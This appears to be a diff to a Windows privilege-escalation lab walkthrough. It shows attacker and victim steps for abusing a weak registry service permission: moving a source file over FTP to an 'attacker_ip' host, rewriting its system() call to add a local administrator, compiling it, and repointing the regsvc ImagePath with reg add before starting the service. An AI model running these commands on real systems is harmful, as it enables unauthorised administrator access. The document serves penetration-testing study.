@@ -118,3 +118,28 @@ Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 
 // so we found it contains full control so we going add a malicious service which add a administrator account for the attacker 
 ```
+
+**Attacker** 
+
+we going to get the file in windows and modify it and again run it. Here to get the file from the windows we are going to run a ftp using python 
+
+```
+python -m pyftplib -p 21 --write 
+
+// now open cmd from the folder of windows_service.c in the victim machine and connect to the ftp with anonymous
+ftp attacker_ip 
+put windows_service.c 
+```
+
+Now the file is transferred to the attacker machine 
+
+- Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
+- Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
+- Copy the generated file x.exe, to the Windows VM using python server 
+
+**Again in Victim**
+
+- Place x.exe in ‘C:\Temp’.
+- Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+- In the command prompt type: sc start regsvc
+- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
